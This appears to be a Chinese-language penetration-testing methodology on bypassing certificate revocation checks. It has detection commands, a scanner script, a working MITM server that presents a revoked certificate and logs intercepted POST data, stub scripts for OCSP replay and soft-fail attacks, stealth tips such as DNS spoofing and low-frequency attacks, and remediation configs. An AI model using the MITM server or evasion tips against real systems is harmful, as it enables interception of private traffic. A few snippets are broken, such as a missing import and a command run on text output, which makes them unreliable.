# 证书吊销检查绕过攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的证书吊销检查绕过攻击检测和利用流程。证书吊销检查漏洞是指系统未正确检查证书是否已被吊销（通过 CRL 或 OCSP），可能导致接受已被吊销的证书，造成中间人攻击等安全风险。

## 1.2 适用范围

本文档适用于所有使用 TLS/SSL 证书验证的系统，包括：
- HTTPS Web 应用
- API 服务
- 移动应用后端
- 代码签名验证
- 文档签名验证
- 邮件服务（S/MIME）

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

证书吊销检查绕过攻击针对系统未正确检查证书吊销状态的缺陷：

| 漏洞类型 | CWE 映射 | 描述 |
|---------|---------|------|
| 未检查 CRL | CWE-299 | 未检查证书吊销列表 |
| 未检查 OCSP | CWE-299 | 未进行在线证书状态协议检查 |
| CRL 缓存过长 | CWE-299 | 使用过期的 CRL 缓存 |
| OCSP 绑定攻击 | CWE-299 | OCSP 响应可被重放 |
| 软失败处理 | CWE-299 | 吊销检查失败时接受证书 |

**本质问题**：
- 未实施证书吊销检查
- CRL/OCSP 检查可被绕过
- 吊销检查失败时采用"软失败"策略
- CRL 缓存时间过长
- OCSP 响应可重放

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-299 | 证书吊销检查不当 (Improper Check for Certificate Revocation) |
| CWE-295 | 证书验证不当 (Improper Certificate Validation) |
| CWE-300 | 通道外数据传输 (Channel Accessible by Non-Endpoint) |

### 证书吊销机制

| 机制 | 描述 | 优缺点 |
|-----|------|-------|
| CRL | 证书吊销列表，定期发布 | 完整但体积大，更新延迟 |
| OCSP | 在线证书状态协议，实时查询 | 实时但依赖 OCSP 服务器 |
| OCSP Stapling | 服务器提供 OCSP 响应 | 减少延迟，隐私保护 |
| CRLite | 基于布隆过滤器的高效检查 | 高效但需要额外基础设施 |

### 风险场景

| 场景 | 风险等级 | 说明 |
|-----|---------|------|
| 完全无吊销检查 | 严重 | 接受任何有效签名的吊销证书 |
| 软失败策略 | 高 | 吊销检查失败时接受证书 |
| CRL 缓存过长 | 中 - 高 | 可能接受刚被吊销的证书 |
| OCSP 可绕过 | 高 | 可伪造 OCSP 响应 |
| 无 OCSP Stapling | 中 | 依赖外部 OCSP 服务器 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 移动应用 | App API 通信 | 证书吊销检查被禁用 |
| IoT 设备 | 设备云服务通信 | 无 CRL/OCSP 检查 |
| 内部系统 | 内网服务通信 | 吊销检查配置错误 |
| 代码签名 | 软件更新验证 | 未检查签名证书吊销状态 |
| 文档签名 | PDF/Office 签名 | 未验证签名证书有效性 |
| 邮件服务 | S/MIME 加密 | 未检查邮件证书吊销 |
| 客户端应用 | 桌面应用 HTTPS | 吊销检查软失败 |
| 嵌入式系统 | 固件更新验证 | 无证书吊销检查 |

### 常见代码缺陷

```python
# ❌ 危险模式：未启用吊销检查
import requests
# 默认不检查 CRL/OCSP
response = requests.get('https://target.com')

# ❌ 危险模式：urllib 未配置吊销检查
import urllib.request
context = ssl.create_default_context()
# 未设置 check_hostname 和 verify_mode
# 未启用 CRL/OCSP

# ❌ 危险模式：Java 软失败
System.setProperty("com.sun.net.ssl.checkRevocation", "false");

# ❌ 危险模式：.NET 未启用吊销检查
ServicePointManager.CheckCertificateRevocationList = false;

# ✅ 正确模式：启用吊销检查（Python 需要额外库）
import ssl
import OpenSSL

context = ssl.create_default_context()
# 使用 OpenSSL 配置吊销检查
# 需要额外配置 CRL/OCSP

# ✅ 正确模式：Java 启用吊销检查
System.setProperty("com.sun.net.ssl.checkRevocation", "true");
System.setProperty("com.sun.security.enableCRLDP", "true");
```

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**检查证书吊销状态**：

```bash
# 获取目标证书
openssl s_client -connect target.com:443 -showcerts 2>/dev/null | \
    openssl x509 -noout -text > cert.txt

# 检查 CRL 分发点
grep -A 2 "CRL Distribution Points" cert.txt

# 检查 OCSP 服务器
grep -A 2 "Authority Information Access" cert.txt

# 获取 CRL URL
CRL_URL=$(openssl x509 -noout -text -in cert.txt | \
    grep -A 1 "CRL Distribution" | grep URI | cut -d: -f2-)
echo "CRL URL: $CRL_URL"

# 获取 OCSP URL
OCSP_URL=$(openssl x509 -noout -text -in cert.txt | \
    grep -A 1 "OCSP" | grep URI | cut -d: -f2-)
echo "OCSP URL: $OCSP_URL"
```

**测试 CRL 检查**：

```bash
# 下载 CRL
curl -o cert.crl "$CRL_URL"

# 解析 CRL
openssl crl -in cert.crl -inform DER -text -noout

# 检查证书是否在 CRL 中
CERT_SERIAL=$(openssl x509 -noout -serial -in cert.txt | cut -d= -f2)
echo "Certificate Serial: $CERT_SERIAL"

# 检查序列号是否在 CRL 中
openssl crl -in cert.crl -inform DER -text -noout | grep -i "$CERT_SERIAL"
```

**测试 OCSP 响应**：

```bash
# 获取证书链
openssl s_client -connect target.com:443 \
    -showcerts 2>/dev/null > chain.pem

# 提取中间证书
# （需要手动分离证书）

# 查询 OCSP
openssl ocsp -issuer intermediate.crt \
    -cert cert.crt \
    -url "$OCSP_URL" \
    -text
```

**自动化吊销检查检测脚本**：

```python
#!/usr/bin/env python3
"""
证书吊销检查检测脚本
检测目标是否实施证书吊销检查
"""

import ssl
import socket
import subprocess
import sys
from urllib.parse import urlparse

class RevocationCheckScanner:
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def get_certificate_info(self):
        """获取证书信息"""
        parsed = urlparse(self.target)
        hostname = parsed.hostname or self.target
        port = parsed.port or 443
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        try:
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert_bin = ssock.getpeercert(binary_form=True)
                    return cert_bin
        except Exception as e:
            print(f"[-] Error getting certificate: {e}")
            return None
    
    def extract_urls_from_cert(self, cert_bin):
        """从证书提取 CRL 和 OCSP URL"""
        # 使用 openssl 解析证书
        import tempfile
        import subprocess
        
        with tempfile.NamedTemporaryFile(suffix='.der', delete=False) as f:
            f.write(cert_bin)
            cert_file = f.name
        
        try:
            # 获取 CRL URL
            result = subprocess.run(
                ['openssl', 'x509', '-in', cert_file, '-inform', 'DER',
                 '-noout', '-text'],
                capture_output=True, text=True
            )
            
            output = result.stdout
            
            # 提取 CRL URL
            crl_urls = []
            in_crl = False
            for line in output.split('\n'):
                if 'CRL Distribution Points' in line:
                    in_crl = True
                elif in_crl:
                    if 'URI:' in line:
                        url = line.split('URI:')[1].strip()
                        crl_urls.append(url)
                    if line.strip() and not line.startswith(' '):
                        in_crl = False
            
            # 提取 OCSP URL
            ocsp_urls = []
            in_aia = False
            for line in output.split('\n'):
                if 'Authority Information Access' in line:
                    in_aia = True
                elif in_aia:
                    if 'OCSP - URI:' in line:
                        url = line.split('OCSP - URI:')[1].strip()
                        ocsp_urls.append(url)
                    if line.strip() and not line.startswith(' '):
                        in_aia = False
            
            return crl_urls, ocsp_urls
        finally:
            import os
            os.unlink(cert_file)
    
    def check_crl_accessible(self, crl_url):
        """检查 CRL 是否可访问"""
        import requests
        try:
            response = requests.get(crl_url, timeout=10)
            if response.status_code == 200:
                return True
        except:
            pass
        return False
    
    def check_ocsp_accessible(self, ocsp_url):
        """检查 OCSP 服务器是否可访问"""
        import requests
        try:
            # OCSP 使用 POST
            response = requests.post(ocsp_url, timeout=10)
            # OCSP 响应通常是 200
            if response.status_code == 200:
                return True
        except:
            pass
        return False
    
    def test_revocation_check(self):
        """测试吊销检查"""
        print(f"[*] Testing certificate revocation check for {self.target}")
        print("="*60)
        
        # 获取证书
        cert_bin = self.get_certificate_info()
        if not cert_bin:
            print("[-] Failed to get certificate")
            return
        
        print("[+] Certificate retrieved")
        
        # 提取 URL
        crl_urls, ocsp_urls = self.extract_urls_from_cert(cert_bin)
        
        print(f"\nCRL Distribution Points:")
        for url in crl_urls:
            print(f"  - {url}")
            accessible = self.check_crl_accessible(url)
            status = "[OK]" if accessible else "[FAIL]"
            print(f"    {status} Accessible: {accessible}")
        
        print(f"\nOCSP Servers:")
        for url in ocsp_urls:
            print(f"  - {url}")
            accessible = self.check_ocsp_accessible(url)
            status = "[OK]" if accessible else "[FAIL]"
            print(f"    {status} Accessible: {accessible}")
        
        # 分析
        if not crl_urls and not ocsp_urls:
            self.findings.append({
                'type': 'NO_REVOCATION_INFO',
                'severity': 'HIGH',
                'description': 'Certificate has no CRL or OCSP URLs'
            })
            print("\n[HIGH] Certificate has no revocation information!")
        
        if crl_urls:
            accessible_count = sum(1 for url in crl_urls if self.check_crl_accessible(url))
            if accessible_count == 0:
                self.findings.append({
                    'type': 'CRL_INACCESSIBLE',
                    'severity': 'MEDIUM',
                    'description': 'All CRL distribution points are inaccessible'
                })
                print("\n[MEDIUM] All CRL URLs are inaccessible!")
        
        if ocsp_urls:
            accessible_count = sum(1 for url in ocsp_urls if self.check_ocsp_accessible(url))
            if accessible_count == 0:
                self.findings.append({
                    'type': 'OCSP_INACCESSIBLE',
                    'severity': 'MEDIUM',
                    'description': 'All OCSP servers are inaccessible'
                })
                print("\n[MEDIUM] All OCSP servers are inaccessible!")
    
    def generate_report(self):
        """生成报告"""
        print("\n" + "="*60)
        print("Certificate Revocation Check Report")
        print("="*60)
        
        if not self.findings:
            print("[PASS] No revocation check issues found")
        else:
            print(f"[FAIL] Found {len(self.findings)} issue(s):\n")
            for finding in self.findings:
                print(f"Type: {finding['type']}")
                print(f"Severity: {finding['severity']}")
                print(f"Description: {finding['description']}")
                print("-" * 40)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        scanner = RevocationCheckScanner(sys.argv[1])
        scanner.test_revocation_check()
        scanner.generate_report()
    else:
        print("Usage: python revocation_scanner.py <https://target.com>")
```

### 2.3.2 白盒检测方法

**代码审计要点**：

```python
# 搜索吊销检查配置
grep -r "checkRevocation" .
grep -r "CheckCertificateRevocation" .
grep -r "CRL" .
grep -r "OCSP" .
grep -r "revocation" .

# 搜索软失败配置
grep -r "soft.*fail" .
grep -r "fail.*soft" .
```

**配置文件检查**：

```bash
# Java 吊销检查配置
grep -r "checkRevocation" /etc/java/
grep -r "CRLDP" /etc/java/

# .NET 吊销检查配置
grep -r "CheckCertificateRevocationList" .

# OpenSSL 配置
grep -r "CRL" /etc/ssl/
grep -r "OCSP" /etc/ssl/
```

## 2.4 漏洞利用方法

### 2.4.1 吊销证书重放攻击

```python
#!/usr/bin/env python3
"""
吊销证书重放攻击
利用目标未检查证书吊销状态的漏洞
"""

import ssl
import socket
import tempfile
import subprocess

class RevokedCertificateExploiter:
    def __init__(self, target, revoked_cert_path, revoked_key_path):
        self.target = target
        self.revoked_cert = revoked_cert_path
        self.revoked_key = revoked_key_path
    
    def create_mitm_server(self, port=8443):
        """创建中间人服务器"""
        import threading
        from http.server import HTTPServer, SimpleHTTPRequestHandler
        
        class MITMHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[+] Intercepted GET: {self.path}")
                # 可以记录或修改请求
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                print(f"[+] Intercepted POST: {post_data.decode()}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
        
        # 创建 SSL 上下文使用吊销证书
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(self.revoked_cert, self.revoked_key)
        
        server = HTTPServer(('0.0.0.0', port), MITMHandler)
        server.socket = context.wrap_socket(server.socket, server_side=True)
        
        print(f"[*] MITM server started on port {port}")
        print(f"[*] Using REVOKED certificate")
        print(f"[*] Targets without revocation check will connect")
        
        server.serve_forever()
    
    def test_connection(self):
        """测试目标是否接受吊销证书"""
        # 这需要实际有一个被吊销的证书
        # 在实际攻击中，攻击者可能：
        # 1. 使用已泄露的吊销证书
        # 2. 通过攻击使证书被吊销但继续使用该证书
        # 3. 使用过期但签名有效的证书
        
        print("[*] Testing if target accepts revoked certificate...")
        
        # 模拟测试（实际需要一个真实的吊销证书）
        print("[!] This requires a real revoked certificate")
        print("[!] In a real attack, use a compromised/revoked cert")

if __name__ == '__main__':
    # 示例用法（需要吊销证书）
    # exploiter = RevokedCertificateExploiter(
    #     'target.com',
    #     'revoked_cert.pem',
    #     'revoked_key.pem'
    # )
    # exploiter.create_mitm_server()
    print("[*] This script demonstrates the attack concept")
    print("[*] A real revoked certificate is required for actual exploitation")
```

### 2.4.2 OCSP 响应重放攻击

```python
#!/usr/bin/env python3
"""
OCSP 响应重放攻击
利用 OCSP 响应可重放的漏洞
"""

import requests
import subprocess

class OCSPReplayAttacker:
    def __init__(self, target_cert, ocsp_url):
        self.target_cert = target_cert
        self.ocsp_url = ocsp_url
    
    def capture_valid_ocsp_response(self):
        """捕获有效的 OCSP 响应"""
        print("[*] Capturing valid OCSP response...")
        
        # 使用 openssl 查询 OCSP
        result = subprocess.run([
            'openssl', 'ocsp',
            '-issuer', 'issuer.crt',
            '-cert', self.target_cert,
            '-url', self.ocsp_url,
            '-out', 'ocsp_response.der'
        ], capture_output=True)
        
        if result.returncode == 0:
            print("[+] OCSP response captured")
            return 'ocsp_response.der'
        else:
            print("[-] Failed to capture OCSP response")
            return None
    
    def replay_ocsp_response(self):
        """重放 OCSP 响应"""
        print("[*] Replaying OCSP response...")
        
        # 在某些实现中，OCSP 响应可以被重放
        # 特别是当响应没有正确的有效期检查时
        
        # 读取之前捕获的响应
        try:
            with open('ocsp_response.der', 'rb') as f:
                ocsp_response = f.read()
            
            print(f"[+] OCSP response size: {len(ocsp_response)} bytes")
            print("[!] In vulnerable implementations,")
            print("    this response can be replayed")
            
        except FileNotFoundError:
            print("[-] OCSP response file not found")
    
    def analyze_ocsp_response(self, response_file):
        """分析 OCSP 响应"""
        print("[*] Analyzing OCSP response...")
        
        result = subprocess.run([
            'openssl', 'ocsp',
            '-respin', response_file,
            '-text'
        ], capture_output=True, text=True)
        
        print(result.stdout)
        
        # 检查响应有效期
        if 'This Update' in result.stdout:
            print("[*] Checking validity period...")
            # 分析是否可以重放

if __name__ == '__main__':
    # 示例用法
    # attacker = OCSPReplayAttacker('target.crt', 'http://ocsp.example.com')
    # attacker.capture_valid_ocsp_response()
    # attacker.replay_ocsp_response()
    print("[*] OCSP replay attack demonstration")
    print("[*] Requires valid certificate and OCSP URL")
```

### 2.4.3 CRL 缓存攻击

```python
#!/usr/bin/env python3
"""
CRL 缓存攻击
利用 CRL 缓存时间过长的漏洞
"""

import time
import subprocess

class CRLCacheAttacker:
    def __init__(self, target, crl_url):
        self.target = target
        self.crl_url = crl_url
    
    def poison_crl_cache(self):
        """污染 CRL 缓存"""
        print("[*] Attempting to poison CRL cache...")
        
        # 攻击思路：
        # 1. 在证书被吊销之前建立连接
        # 2. 目标缓存 CRL（此时证书未被吊销）
        # 3. 证书被吊销
        # 4. 目标仍使用缓存的旧 CRL
        
        print("[!] Attack requires:")
        print("    1. Access to CRL distribution")
        print("    2. Long CRL cache interval on target")
        print("    3. Timing the certificate revocation")
    
    def test_crl_cache_duration(self):
        """测试 CRL 缓存时间"""
        print("[*] Testing CRL cache duration...")
        
        # 方法：
        # 1. 首次连接，触发 CRL 下载
        # 2. 等待不同时间间隔
        # 3. 再次连接，观察是否重新下载 CRL
        
        print("[*] This requires network monitoring capability")
        print("[*] Monitor for CRL fetch requests")

if __name__ == '__main__':
    print("[*] CRL cache attack demonstration")
    print("[*] Requires specific target configuration")
```

### 2.4.4 软失败攻击

```python
#!/usr/bin/env python3
"""
软失败攻击
利用吊销检查失败时接受证书的漏洞
"""

import ssl
import socket
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

class SoftFailAttacker:
    def __init__(self, target):
        self.target = target
    
    def block_revocation_check(self):
        """阻断吊销检查"""
        print("[*] Blocking revocation check...")
        
        # 攻击思路：
        # 1. 阻断到 CRL/OCSP 服务器的连接
        # 2. 目标实施软失败策略
        # 3. 目标接受证书尽管无法检查吊销状态
        
        # 这通常需要网络层攻击能力
        print("[!] Attack requires network-level capability:")
        print("    - Block CRL/OCSP server access")
        print("    - Force soft-fail behavior")
    
    def create_fake_crl_server(self):
        """创建假 CRL 服务器"""
        print("[*] Creating fake CRL server...")
        
        # 如果攻击者可以：
        # 1. DNS 欺骗 CRL 域名
        # 2. 或控制 CRL 服务器
        # 则可以返回假的 CRL
        
        print("[!] This requires DNS spoofing or server compromise")

if __name__ == '__main__':
    print("[*] Soft-fail attack demonstration")
    print("[*] Requires specific target behavior")
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 OCSP 检查

```python
# OCSP 绕过技巧

# 1. OCSP 绑定攻击
# 如果 OCSP 响应没有正确的 nonce
# 可以重放旧的 OCSP 响应

# 2. OCSP 服务器阻断
# 阻断到 OCSP 服务器的连接
# 依赖软失败策略

# 3. DNS 欺骗
# 欺骗 OCSP 服务器域名
# 返回伪造的 OCSP 响应
```

### 2.5.2 绕过 CRL 检查

```python
# CRL 绕过技巧

# 1. CRL 缓存攻击
# 利用长缓存时间
# 在证书吊销前建立缓存

# 2. CRL 服务器阻断
# 阻断 CRL 下载
# 依赖软失败策略

# 3. CRL 大小攻击
# 如果 CRL 非常大
# 可能导致超时或解析失败
```

### 2.5.3 隐蔽攻击

```python
# 隐蔽攻击技巧

# 1. 时间选择攻击
# 在证书即将过期时攻击
# 减少被发现的时间窗口

# 2. 低频率攻击
# 减少连接频率
# 避免触发异常检测

# 3. 合法证书攻击
# 使用有效但已泄露的证书
# 看起来像正常通信
```

---

# 第三部分：附录

## 3.1 证书吊销检查检查清单

| 检查项 | 测试方法 | 安全要求 |
|-------|---------|---------|
| CRL 配置 | 检查证书 CRL URL | 应有有效的 CRL 分发点 |
| OCSP 配置 | 检查证书 OCSP URL | 应有有效的 OCSP 服务器 |
| CRL 可访问性 | 尝试下载 CRL | CRL 应可公开访问 |
| OCSP 可访问性 | 尝试查询 OCSP | OCSP 应响应查询 |
| 软失败策略 | 阻断吊销检查 | 应硬失败而非软失败 |
| CRL 缓存时间 | 检查缓存配置 | 缓存时间应合理（<24 小时） |
| OCSP Stapling | 检查服务器配置 | 应启用 OCSP Stapling |
| 吊销检查启用 | 检查客户端配置 | 应启用吊销检查 |

## 3.2 常用工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| openssl | 证书/CRL/OCSP 检查 | `openssl ocsp -issuer ca.crt -cert cert.crt` |
| curl | CRL 下载 | `curl -o cert.crl http://crl.example.com/cert.crl` |
| testssl.sh | SSL/TLS 测试 | `./testssl.sh --revocation target.com` |
| SSL Labs | 在线 SSL 测试 | https://www.ssllabs.com/ssltest/ |
| CRLCheck | CRL 检查工具 | 在线 CRL 检查服务 |

## 3.3 修复建议

### 客户端修复

```python
# ✅ Python 启用吊销检查（需要额外配置）
import ssl
import OpenSSL

# 使用 OpenSSL 绑定配置吊销检查
# 这需要更复杂的配置

# ✅ Java 启用吊销检查
System.setProperty("com.sun.net.ssl.checkRevocation", "true");
System.setProperty("com.sun.security.enableCRLDP", "true");

// 配置 CRL 缓存时间
System.setProperty("com.sun.security.crl.timeout", "3600");

# ✅ .NET 启用吊销检查
ServicePointManager.CheckCertificateRevocationList = true;

# ✅ Node.js 启用吊销检查
// 使用 tls 模块配置
const tls = require('tls');
const options = {
    host: 'target.com',
    port: 443,
    // 启用吊销检查
    // 需要额外配置
};
```

### 服务器端修复

```nginx
# Nginx 启用 OCSP Stapling
server {
    listen 443 ssl;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /path/to/chain.pem;
    
    # DNS 解析 OCSP 服务器
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;
}
```

### Apache 配置

```apache
# Apache 启用 OCSP Stapling
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    SSLCertificateChainFile /path/to/chain.pem
    
    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"
</VirtualHost>
```

## 3.4 参考资源

- [CWE-299: Improper Check for Certificate Revocation](https://cwe.mitre.org/data/definitions/299.html)
- [RFC 6960: Online Certificate Status Protocol (OCSP)](https://www.rfc-editor.org/rfc/rfc6960.html)
- [RFC 5280: X.509 Certificate and CRL Profile](https://www.rfc-editor.org/rfc/rfc5280.html)
- [OWASP Certificate and Public Key Pinning](https://cheatsheetseries.owasp.org/cheatsheets/Certificate_and_Public_Key_Pinning.html)
- [SSL Labs Best Practices](https://www.ssllabs.com/projects/best-practices/)
